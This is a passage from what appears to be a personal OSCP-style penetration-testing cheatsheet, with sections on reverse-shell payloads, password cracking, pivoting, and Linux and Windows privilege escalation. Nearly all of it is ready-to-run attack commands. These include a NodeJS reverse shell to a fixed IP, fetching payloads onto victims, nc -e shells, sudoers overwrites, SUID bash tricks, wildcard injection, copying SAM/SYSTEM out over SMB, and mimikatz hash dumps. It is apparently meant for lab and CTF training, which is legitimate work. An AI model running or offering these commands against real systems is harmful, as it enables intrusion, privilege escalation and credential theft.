+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh
+</code></pre></div></div>
+
+<h3 id="perl">Perl</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.pl
+</code></pre></div></div>
+
+<h3 id="so">Shared object (.so)</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf-so -o exploit.so
+</code></pre></div></div>
+
+<h3 id="listener">Listener</h3>
+
+<h4 id="metasploit">Metasploit</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set PAYLOAD &lt;PAYLOAD&gt;
+set LHOST &lt;LHOST&gt;
+set LPORT &lt;LPORT&gt;
+set ExitOnSession false
+exploit -j -z
+</code></pre></div></div>
+
+<h4 id="netcat">Netcat</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvp &lt;PORT&gt;
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="password-cracking">PASSWORD CRACKING</h2>
+
+<h3 id="online">Online</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
+https://hashes.com/en/decrypt/hash
+
+#Generate wordlist against the website:
+cewl -m 5 -w rockme.lst &lt;url&gt;
+</code></pre></div></div>
+
+<h3 id="hashcat">Hashcat</h3>
+
+<h4 id="linux-password">Linux password</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1800 -a 0 hash.txt rockyou.txt
+hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
+</code></pre></div></div>
+
+<h4 id="windows-password">Windows password</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 1000 -a 0 hash.txt rockyou.txt
+hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
+</code></pre></div></div>
+
+<h4 id="others">Others</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat --example-hashes | grep -i '&lt;BEGINNING_OF_HASH&gt;'
+</code></pre></div></div>
+
+<h4 id="others">Kerberos hash</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat -m 13100 -a 0 hash.txt Pass.txt
+</code></pre></div></div>
+
+<h4 id="rules">Rules</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/NotSoSecure/password_cracking_rules
+</code></pre></div></div>
+
+<h3 id="john">John</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=&lt;PASSWORDS_LIST&gt; hash.txt
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Create a mutated wordlist containing basic usernames
+echo 'username' > password.txt
+john --wordlist=./password.txt --rules --stdout > passwords-mutated.txt
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="pivoting">PIVOTING</h2>
+
+<h3 id="sshuttle">Sshuttle</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshuttle (-r) &lt;USER&gt;@&lt;IP&gt; &lt;IP_OF_THE_INTERFACE&gt;/CIDR
+</code></pre></div></div>
+
+<h3 id="proxychains">Proxychains</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh [-f -N] -D 192.168.119.164:9050 &lt;USER&gt;@&lt;IP&gt;
+  (OR for windows get Chesel from: https://github.com/jpillora/chisel/releases
+      Attacker: ./chisel server -p 8000 --reverse
+      Target:   ./chisel client &lt;SERVER IP>:8000 R:socks
+      then use proxychains (ensure to modify /etc/proxychains.conf i.e: socks4 192.168.119.179 9050)
+  )
+
+service tor start
+service tor status
+service tor restart (if you get any connection problem)
+proxychains firefox www.duckduckgo.com
+
+proxychains &lt;COMMAND&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Double pivoting
+<img src="./OSCP%20personal%20cheatsheet_files/double-pivoting.jpg">
+</code></pre></div></div>
+
+<h3 id="interesting-link">Interesting link</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://artkond.com/2017/03/23/pivoting-guide/
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="privile-escalation">PRIVILE ESCALATION</h2>
+
+<h3 id="linux-4">Linux</h3>
+
+<h4 id="enumeration-scripts">Enumeration scripts</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash LinEnum.sh
+bash lse.sh -l 1
+bash linpeas.sh
+# Output to file
+./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
+less -r /dev/shm/linpeas.txt #Read with colors
+#
+python linuxprivchecker.py
+./unix-privesc-check standard
+</code></pre></div></div>
+
+<h4 id="vulnerability-scan">Vulnerability scan</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl les2.pl
+bash les.sh
+</code></pre></div></div>
+
+<h4 id="suid-checker">Suid checker</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python suid3num.py
+
+https://gtfobins.github.io/
+</code></pre></div></div>
+
+<h4 id="methodology-to-follow">Methodology to follow</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://guif.re/linuxeop
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+Kernel Exploits
+  Linux version 3.0.0-12-generic
+    https://www.exploit-db.com/exploits/35161
+  Linux Kernel 2.6 < 2.6.19
+    https://www.exploit-db.com/exploits/9542
+  Linux Kernel 2.6.22 < 3.9 - 'Dirty COW'
+    https://www.exploit-db.com/exploits/40839
+OS Exploits
+Password reuse (mysql, .bash_history, 000- default.conf...)
+Known binaries with suid flag and interactive (nmap)
+Custom binaries with suid flag either using other binaries or with command execution
+Writable files owned by root that get executed (cronjobs)
+MySQL as root (https://github.com/lamontns/pentest/blob/master/privilege-escalation/linux-privilege-escalation.md)
+Vulnerable services (chkrootkit, logrotate)
+Writable /etc/passwd
+Readable .bash_history
+SSH private key
+Listening ports on localhost
+/etc/fstab
+/etc/exports
+/var/mail
+Process as other user (root) executing something you have permissions to modify
+SSH public key + Predictable PRNG
+apt update hooking (PreInvoke)
+</code></pre></div></div>
+<!--<Dane>-->
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<strong>From /THM/Skynet: (the script must be run as root privilege)</strong>
+echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
+echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+</code></pre></div></div>
+<!--</Dane>-->
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo version
+https://github.com/rabiulhsantahin/ctf/blob/main/sudo-exploit.txt
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>NodeJs reverse shell</strong>
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4444, "10.11.61.135", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>Soft link file</strong>
+echo "cp /bin/bash /home/user/shell; chmod +xs /home/user/shell" > newScript.sh
+chmod +x newScript.sh
+ln -sf newScript.sh originScript.sh
+./shell -p
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><strong>If it's has a cron job running some command with wildcard like: rsync -t *</strong>
+(If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.)
+# Create script that make cron job run:
+echo "cp /bin/bash /home/user/shell; chmod +xs /home/user/shell" > script.sh
+chmod +x script.sh
+# Create a new file with cmd in name
+touch -- "-e sh script.sh"
+OR touch -- "-e bash script.sh"
+# Run shell.sh which was created by cron job for us
+./home/user/shell -p
+
+(
+  tar -cf archive.tar *
+  Creating the two files:
+    --checkpoint=1
+    --checkpoint-action=exec=sh script.sh
+)
+
+###maybe you need this
+cp -f /bin/bash /dev/shm/bash && chmod u+s /dev/shm/bash
+###
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><strong>If it's has a root owner executable file with SUID bit set and it contains an executable file name (without absolute path <- this will make the system run from $PATH)</strong>
+Example exploitation:
+export PATH=/tmp:$PATH (#/tmp can be replaced by other writable directory)
+cd /tmp
+echo "/bin/bash" > thm (#thm is the file name called in the SUID bit set file)
+chmod 777 thm
+&lt;path>/&lt;SUID bit set file>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#(ldx) group: https://www.hackingarticles.in/lxd-privilege-escalation/
+https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+#attacker
+  git clone  https://github.com/saghul/lxd-alpine-builder.git
+  cd lxd-alpine-builder
+  ./build-alpine
+
+  python3 -m http.server 8000
+
+#victim
+  cd /tmp
+  wget http://10.11.61.135:8000/alpine-v3.15-x86_64-20220405_0347.tar.gz
+
+  lxc image import ./alpine-v3.15-x86_64-20220405_0347.tar.gz --alias myimage
+  #lxc image list
+  (If this is your first time running LXD on this machine, you should also run: lxd init)
+  #lxd init
+  #IF: Error: Failed to create network 'lxdbr0': Network has ipv6.address but kernel IPv6 support is missing
+  #THEN: What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none 
+  lxc init myimage mycontainer -c security.privileged=true
+  lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+  lxc start mycontainer
+  lxc exec mycontainer /bin/sh
+  (cd /mnt/root/root)
+
+#(admin) group:
+  find / -group admin 2>/dev/null
+</code></pre></div></div>
+
+<h3 id="windows-4">Windows</h3>
+
+<h4 id="enumeration-scripts-1">Enumeration scripts</h4>
+
+<h5 id="general-scans">General scans</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
+windows-privesc-check2.exe
+Seatbelt.exe -group=all
+powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+Powerless.bat
+winPEAS.bat
+</code></pre></div></div>
+
+<h5 id="search-for-cve">Search for CVE</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>systeminfo &gt; systeminfo.txt
+python windows-exploit-suggester.py --update
+python windows-exploit-suggester.py --database &lt;DATE&gt;-mssb.xlsx --systeminfo systeminfo.txt | grep 'Elevation'
+  #[E] for available on exploit-db; [M] for available for Metasploit
+  -MS16-032:  https://gist.githubusercontent.com/intrd/6dda33f61dca560e6996d01c62203374/raw/babf9a6afd23bb17a89bb3415099459db7bd25cf/ms16_032_intrd_mod.ps1
+    (only work on x64 powershell: C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe)
+
+systeminfo &gt; systeminfo.txt
+wmic qfe &gt; qfe.txt
+python wes.py -u
+python wes.py systeminfo.txt qfe.txt
+
+powershell -exec bypass -command "&amp; { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+</code></pre></div></div>
+
+<h5 id="post-exploitation">Post exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lazagne.exe all
+SharpWeb.exe
+mimikatz.exe
+firepwd.py # https://github.com/lclevy/firepwd (an open source tool to decrypt Mozilla protected passwords)
+Enumeration w/PowerView # https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
+  powershell -ep bypass
+  . .\PowerView.ps1 (Import-Module .\PowerView.ps1)
+    get-netuser | select cn
+    get-netgroup -GroupName *admin*
+    Invoke-ShareFinder
+    Get-NetComputer -fulldata | select operatingsystem
+    Get-NetUser -Domain CONTROLLER.local | Where-Object {$
+  _.servicePrincipalName} | select name, samaccountname, serviceprincipalname
+    (https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet)
+Dumping hashes w/mimikatz
+  mimikatz.exe
+  privilege::debug [output should be '20' OK to ensure it has the administrator privilege]
+  lsadump::lsa /patch [Dump those hashes]
+  hashcat -m 1000 &lt;hash&gt; rockyou.txt
+</code></pre></div></div>
+
+<h4 id="juicypotato-seimpersonate-or-seassignprimarytoken">JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
+
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe &lt;IP&gt; &lt;PORT&gt; -e c:\windows\system32\cmd.exe" -t * -c &lt;CLSID&gt;
+
+# CLSID
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+</code></pre></div></div>
+
+<h4 id="methodology-to-follow-1">Methodology to follow</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#1. Enumerate the current user's privileges and resources it can access.
+  #User enumeration
+    Current user’s privileges: <strong>whoami /priv</strong>
+    List users: <strong>net users</strong>
+    List details of a user: <strong>net user username</strong> (e.g. net user Administrator)
+    Other users logged in simultaneously: <strong>qwinsta</strong> (the <strong>query session</strong> command can be used the same way)
+    User groups defined on the system: <strong>net localgroup</strong>
+    List members of a specific group: <strong>net localgroup groupname</strong> (e.g. net localgroup Administrators)
+  
+  #Systeminfo
+    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
+  
+  #Searching files
+    findstr /si password *.xml *.ini *.txt (*.config *.xls)
+      Command breakdown:
+      findstr: Searches for patterns of text in files.
+      /si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
+      password: The command will search for the string “password” in files
+      *.txt: The search will cover files that have a .txt extension
+  
+  #Patch level
+    wmic qfe get Caption,Description,HotFixID,InstalledOn
+  
+  #Network connection
+    List all listening ports: <strong>netstat -ano</strong>
+      -a: Displays all active connections and listening ports on the target system.
+      -n: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
+      -o: Displays the process ID using each listed connection.
+  
+  #Scheduled tasks
+    schtasks /query /fo LIST /v
+  
+  #Drivers
+    driverquery
+  
+  #Antivirus
+    sc query windefend
+    sc queryex type=service
+    
+#2. If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1
+#3. If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach (e.g. manually go over a checklist like the one provided <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">HERE</a>)
+
+  <b style="color:red">#Unquoted Service Path</b>
+    #Find unquoted path & contained space in path
+      wmic service get name,displayname,pathname,startmode | findstr "Program Files"
+    #Check for permission (look for Full, Write, Modify) on folder has name containing space
+      .\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
+      
+    (Attacker) msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.61.135 LPORT=4444 -f exe > 1st_word_of_sub_folder.exe      (i.e: /zen services -> zen.exe)
+    (A) python3 -m http.server 8000 | nc -lnvp 4444
+    powershell.exe Invoke-WebRequest -Uri http://10.11.61.135:8000/1st_word_of_sub_folder.exe -OutFile ./1st_word_of_sub_folder.exe
+    sc stop [unquoted_service_name]
+    sc start [unquoted_service_name]
+
+  <b style="color:red">#AlwaysInstallElevated</b>
+    #Check if these registry values are set to "1".
+      reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+    #If the above settings are set:
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+    #Transfer to victim machine:
+      msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+
+  <b style="color:red">#Runas</b>
+    #List saved credentials:
+      cmdkey /list
+    #If any creds worth trying:
+      runas /savecred /user:admin reverse_shell.exe
+    (msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP> LPORT=&lt;PORT> -f exe > shell.exe)
+    #Registry keys potentially containing passwords can be queried:
+      reg query HKLM /f password /t REG_SZ /s
+        #reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+        #winexe -U 'admin%password' //10.10.73.227 cmd.exe
+      reg query HKCU /f password /t REG_SZ /s
+
+  <b style="color:red">#Weak Registry Permissions</b>
+    #Detect:
+      (winPEASany.exe)
+      [+] Looking if you can modify any service registry()
+        [?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions                                                                             
+          HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
+          #sc qc regsvc (confirm)
+          #Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+            C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+              RW NT AUTHORITY\INTERACTIVE
+                KEY_ALL_ACCESS
+
+    #Exploit: Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
+      reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
+      net start regsvc
+
+  <b style="color:red">#Security Account Manager (SAM)</b>
+    #Detect:
+      (winPEASany.exe)
+        +] Looking for common SAM & SYSTEM backups()
+          C:\Windows\repair\SAM
+          C:\Windows\repair\SYSTEM
+    #Exploit:
+      (kali) sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+      (windows)
+        copy C:\Windows\Repair\SAM \\10.11.61.135\kali\
+        copy C:\Windows\Repair\SYSTEM \\10.11.61.135\kali\
+      (kali) python3 ~/Workspace/THM/tools/WIN/creddump7/pwdump.py SYSTEM SAM
+             #python3 /usr/share/creddump7/pwdump.py SYSTEM SAM
+              #LM:NTLM
+             hashcat -m 1000 --force &lt;NTLM-hash> /usr/share/wordlists/rockyou.txt 
+             #You can use the cracked password to log in as the admin using winexe or RDP.
+             OR use full hash (LM:NTLM) with pth-winexe to spawn a shell running as admin:
+              pth-winexe -U 'admin%hash' //10.10.220.219 cmd.exe
+
+https://guif.re/windowseop
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
+http://www.fuzzysecurity.com/tutorials/16.html
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+</code></pre></div></div>
+
+<h4 id="autorun">Autorun</h4>
+
+<h5 id="detection">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for modifiable registry autoruns and configs...
+
+Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+Path           : "C:\Program Files\Autorun Program\program.exe"
+ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
+
+[+] Autorun Applications(T1010)
+    Folder: C:\Program Files\Autorun Program
+    File: C:\Program Files\Autorun Program\program.exe
+    FilePerms: Everyone [AllAccess]
+</code></pre></div></div>
+
+<h5 id="exploitation">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+cd C:\Program Files\Autorun Program\
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', '.\program.exe')
+
+To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+</code></pre></div></div>
+
+<h4 id="alwaysinstallelevated">AlwaysInstallElevated</h4>
+
+<h5 id="detection-1">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+AbuseFunction : Write-UserAddMSI
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+If both values are equal to 1 then it's vulnerable.
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
+
+[+] Checking AlwaysInstallElevated(T1012)
+
+  AlwaysInstallElevated set to 1 in HKLM!
+  AlwaysInstallElevated set to 1 in HKCU!
+</code></pre></div></div>
+
+<h5 id="exploitation-1">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f msi &gt; program.msi
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.msi', 'C:\Temp\program.msi')
+msiexec /quiet /qn /i C:\Temp\program.msi
+</code></pre></div></div>
+
+<h4 id="executable-files">Executable Files</h4>
+
+<h5 id="detection-2">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking service executable and argument permissions...
+
+ServiceName                     : filepermsvc
+Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
+ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
+ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
+ModifiableFileIdentityReference : Everyone
+StartName                       : LocalSystem
+AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+CanRestart                      : True
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
+
+[+] Interesting Services -non Microsoft-(T1007)
+
+filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+	File Permissions: Everyone [AllAccess]
+</code></pre></div></div>
+
+<h5 id="exploitation-2">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', 'C:\Temp\program.exe')
+copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+sc start filepermsvc
+</code></pre></div></div>
+
+<h4 id="startup-applications">Startup applications</h4>
+
+<h5 id="detection-3">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+C:\&gt;icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
+                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
+                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
+                                                             Everyone:(I)(OI)(CI)(RX)
+
+If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
+</code></pre></div></div>
+
+<h5 id="exploitation-3">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; program.exe
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/program.exe', '.\program.exe')
+
+To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+</code></pre></div></div>
+
+<h4 id="weak-service-permission">Weak service permission</h4>
+
+<h5 id="detection-4">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Find all services authenticated users have modify access onto
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+#Enumerate the Program Files directory in search of any file or directory that allows the Everyone36 group write permissions:  
+  accesschk.exe -uws "Everyone" "C:\Program Files"
+
+if SERVICE_ALL_ACCESS then vulnerable (also SERVICE_CHANGE_CONFIG)
+
+# Find all weak folder permissions per drive.
+accesschk.exe /accepteula -uwdqs Users c:\
+accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+
+# Find all weak file permissions per drive.
+accesschk.exe /accepteula -uwqs Users c:\*.*
+accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking service permissions...
+
+ServiceName   : daclsvc
+Path          : "C:\Program Files\DACL Service\daclservice.exe"
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
+CanRestart    : True
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winPEAS.exe
+
+[+] Interesting Services -non Microsoft-(T1007)
+
+daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+	YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
+
+[+] Modifiable Services(T1007)
+	LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+	daclsvc: WriteData/CreateFiles
+</code></pre></div></div>
+
+<h5 id="exploitation-4">Exploitation</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Attacker
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp &lt;PORT&gt;
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://&lt;IP&gt;/nc.exe', '.\nc.exe')
+sc config &lt;SERVICENAME&gt; binpath= "&lt;PATH&gt;\nc.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe"
+#sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
+sc start &lt;SERVICENAME&gt;
+or 
+net start &lt;SERVICENAME&gt;
+</code></pre></div></div>
+
+<h4 id="unquoted-service-paths">Unquoted service paths</h4>
+
+<h5 id="detection-5">Detection</h5>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -exec bypass -command "&amp; { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for unquoted service paths...
+
+ServiceName    : unquotedsvc
+Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path &lt;HijackPath&gt;
+CanRestart     : True
+
+ServiceName    : unquotedsvc
+Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
